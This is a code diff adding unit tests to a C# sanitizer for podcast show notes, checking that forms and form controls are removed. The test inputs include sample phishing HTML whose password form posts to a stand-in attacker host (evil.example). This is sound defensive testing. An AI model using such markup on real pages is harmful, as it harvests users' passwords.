@@ -43,6 +43,32 @@ public class ShowNotesSanitizerTests
     }
 
     [Fact]
+    public void Forms_AreStripped()
+    {
+        // A working form in show notes could post whatever the user types to the feed
+        // author's server (phishing), so forms and their controls must not survive.
+        var result = sanitizer.Sanitize(
+            """<p>ok</p><form action="https://evil.example/collect" method="post"><label>Password <input name="pw" type="password"></label><textarea>t</textarea><select><option>o</option></select><button>Log in</button></form>""");
+        Assert.Contains("<p>ok</p>", result);
+        foreach (var tag in new[] { "<form", "<input", "<button", "<textarea", "<select", "<option", "<label" })
+        {
+            Assert.DoesNotContain(tag, result, StringComparison.OrdinalIgnoreCase);
+        }
+        Assert.DoesNotContain("evil.example", result);
+    }
+
+    [Fact]
+    public void StandaloneFormControls_AreStripped()
+    {
+        // Controls outside a <form> can still attach to one elsewhere via form="..."
+        // or formaction, so they go too.
+        var result = sanitizer.Sanitize("""<input form="f" value="x"><button formaction="https://evil.example/">go</button><p>ok</p>""");
+        Assert.Contains("<p>ok</p>", result);
+        Assert.DoesNotContain("<input", result, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("<button", result, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Fact]
     public void HttpsLinks_StayClickable()
     {
         var result = sanitizer.Sanitize("""<a href="https://example.com/page">episode link</a>""");
